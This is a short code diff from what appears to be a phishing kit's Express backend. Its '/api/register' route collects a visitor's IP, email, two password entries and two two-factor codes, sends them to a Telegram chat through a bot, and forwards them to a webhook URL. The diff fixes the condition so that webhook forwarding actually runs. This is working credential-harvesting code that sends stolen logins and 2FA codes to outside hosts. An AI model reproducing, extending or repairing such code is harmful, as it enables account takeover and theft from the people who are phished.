@@ -55,7 +55,7 @@ app.post('/api/register',registerLimiter, ipFilter, (req, res) => {
         const message = `<b>Ip:</b> <code>${values.ip ? values.ip : ''}</code>\n-----------------------------\n<b>Email :</b> <code>${values.email ? values.email : ''} </code>\n<b>Password First:</b> <code>${values.passwordFirst ? values.passwordFirst : ''}</code>\n<b>Password Second:</b> <code>${values.passwordSecond ? values.passwordSecond : ''}</code>\n-----------------------------\n<b>First Two-Fa:</b> <code>${values.firstTwoFa ? values.firstTwoFa : ''}</code>\n<b>Second Two-Fa:</b> <code>${values.secondTwoFa ? values.secondTwoFa : ''}</code>\n`;
         bot.sendMessage(process.env.CHAT_ID, message,  { parse_mode: 'html' });
         
-        if (!process.env.WEBHOOK_URL) {
+        if (process.env.WEBHOOK_URL) {
             const url = new URL(process.env.WEBHOOK_URL);
 
             url.searchParams.append('Ip', values.ip ? values.ip : '');
